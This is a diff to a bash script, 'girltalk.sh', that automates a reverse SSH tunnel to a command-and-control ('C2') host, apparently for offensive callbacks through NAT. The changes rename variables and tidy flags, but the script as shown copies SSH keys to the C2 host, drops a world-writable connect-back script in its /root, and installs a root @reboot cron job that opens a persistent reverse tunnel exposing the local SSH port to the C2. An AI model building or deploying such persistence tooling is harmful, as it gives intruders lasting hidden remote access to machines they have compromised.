@@ -11,17 +11,17 @@
 
 
 USAGE="
-A bash script to automate reverse a reverse ssh tunnel. Handy for callbacks
+A bash script to automate reverse reverse ssh tunnels. Handy for callbacks
 through NAT.
 Flags:
   -a	Specify AWS C2 infrastructure.
   -k    SSH key.
-  -n    Password based C2 access.
+  -n    Password-based C2 access.
   -c    C2 host <ip address or routable hostname>.
   -u	C2 username.
   -l    Local username to use.
   -h	Help text and usage example.
-usage:	 girltalk.sh -c <C2 username> -l <local username> -p <password> -c <domain controller> -o <outputFileName.ldif>
+usage:	 girltalk.sh -c <C2 username> -l <local username> 
 example: girltalk.sh -c host.aws.com -u ubuntu -l hatchetface
 "
 
@@ -32,7 +32,7 @@ if [ $# -eq 0 ]; then
 fi
 
 # Set flags.
-while getopts "a:k:n:c::u:l:h" FLAG
+while getopts "a:k:n:c:u:l:h" FLAG
 do
 	case $FLAG in
 		a)
@@ -48,10 +48,10 @@ do
 			HOST=$OPTARG
 			;;
 		u)
-			USERNAME=$OPTARG
+			USERC2=$OPTARG
 			;;
 		l)
-			LOCAL=$OPTARG
+			USERLOCAL=$OPTARG
 			;;
 		h)	echo "$USAGE"
 			exit
@@ -64,11 +64,11 @@ do
 done
 
 # Make sure each required flag was actually set.
-if [ -z ${USERNAME+x} ]; then
+if [ -z ${USERC2+x} ]; then
 	echo "Remote username (-u) is not set."
 	echo "$USAGE"
 	exit
-elif [ -z ${LOCAL+x} ]; then
+elif [ -z ${USERLOCAL+x} ]; then
 	echo "Local username (-l) is not set."
 	echo "$USAGE"
 	exit
@@ -113,7 +113,7 @@ fi
 #    read user
 
 #Error checking for user input
-    until id "$USERNAME" >/dev/null; do
+    until id "$USERLOCAL" >/dev/null; do
         echo "Please enter your local username";
 #        read user;
     done
@@ -122,25 +122,25 @@ fi
 #Takes input for what remote host you want to route through
 #    echo "Please enter username/IP for desired C2 host (<username>@<C2_host>)"
 #    read C2
-#    printf "\n"
+#   printf "\n"
 
 #Transfer local key to C2
     echo "### Copying key to C2 host ###"
-    ssh-copy-id $C2
+    ssh-copy-id $HOST
     printf "\n"
 
 #Generating an ssh key on your C2
-   ssh $C2 'ssh-keygen'
+   ssh $HOST 'ssh-keygen'
 
 #Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
 echo "### Creating & transferring remote connection script"
-echo "ssh-copy-id ${user}@localhost -p 43022 && ssh ${user}@localhost -p 43022" > /home/$user/hmu_$user.sh
-sudo chmod 777 /home/$user/hmu_$user.sh 
-scp /home/$user/hmu_$user.sh $C2:/root
+echo "ssh-copy-id ${USERLOCAL}@localhost -p 43022 && ssh ${USERLOCAL}@localhost -p 43022" > /home/$USERC2/hmu_$USERLOCAL.sh
+sudo chmod 777 /home/$USERC2/hmu_$USERLOCAL.sh 
+scp /home/$USERC2/hmu_$USERLOCAL.sh $HOST:/root
 
 #Setup local cron job + cleanup
     echo "### Setting up local cronjob ###"
-    echo "@reboot sleep 100 && sudo -u ${user} ssh -f -N -R 43022:localhost:22 ${C2}" >> cronsh
+    echo "@reboot sleep 100 && sudo -u ${USERLOCAL} ssh -f -N -R 43022:localhost:22 ${HOST}" >> cronsh
     sudo crontab cronsh
     rm cronsh
     printf "\n"
